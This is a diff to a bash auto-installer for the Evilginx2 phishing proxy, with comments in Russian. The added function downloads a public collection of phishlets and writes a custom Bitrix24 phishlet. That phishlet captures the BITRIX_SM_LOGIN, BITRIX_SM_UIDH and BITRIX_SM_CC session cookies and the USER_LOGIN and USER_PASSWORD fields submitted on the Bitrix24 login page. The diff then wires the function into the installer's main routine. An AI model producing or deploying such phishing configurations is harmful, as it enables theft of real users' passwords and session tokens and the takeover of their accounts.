@@ -176,6 +176,62 @@ create_directories() {
     success "Рабочие директории созданы в /root/evilginx2-data/"
 }
 
+# Загрузка популярных phishlets
+download_phishlets() {
+    log "Загрузка популярных phishlets..."
+    
+    # Скачать коллекцию An0nUD4Y
+    cd /tmp
+    if git clone https://github.com/An0nUD4Y/Evilginx2-Phishlets.git 2>/dev/null; then
+        # Копировать все phishlets
+        cp /tmp/Evilginx2-Phishlets/*.yaml /root/evilginx2-data/phishlets/ 2>/dev/null || true
+        
+        # Очистить временную директорию
+        rm -rf /tmp/Evilginx2-Phishlets
+        
+        success "Популярные phishlets загружены"
+    else
+        warning "Не удалось загрузить phishlets. Проверьте интернет-соединение."
+    fi
+    
+    # Создать кастомные phishlets
+    log "Создание кастомных Bitrix24 phishlets..."
+    
+    # Bitrix24 Universal phishlet
+    cat > /root/evilginx2-data/phishlets/bitrix24-universal.yaml << 'EOF'
+author: 'AKUMA-EvilGinx2-AutoInstaller'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: '{target_domain}', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: '{target_domain}', orig_sub: '', domain: '{target_domain}', search: '{target_domain}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: '.{target_domain}'
+    keys: ['BITRIX_SM_LOGIN', 'BITRIX_SM_UIDH', 'BITRIX_SM_CC']
+auth_urls:
+  - '/index.php?login=yes'
+  - '/auth/'
+credentials:
+  username:
+    key: 'USER_LOGIN'
+    search: 'USER_LOGIN=([^&]*)'
+    type: 'post'
+  password:
+    key: 'USER_PASSWORD'
+    search: 'USER_PASSWORD=([^&]*)'
+    type: 'post'
+login:
+  domain: '{target_domain}'
+  path: '/index.php?login=yes'
+EOF
+
+    success "Кастомные phishlets созданы"
+    
+    # Подсчитать количество
+    phishlets_count=$(ls -1 /root/evilginx2-data/phishlets/*.yaml 2>/dev/null | wc -l)
+    success "Всего установлено $phishlets_count phishlets"
+}
+
 # Создание systemd сервиса
 create_service() {
     log "Создание systemd сервиса..."
@@ -256,6 +312,7 @@ main() {
     compile_evilginx
     install_binary
     create_directories
+    download_phishlets
     create_service
     final_check
     show_usage_info
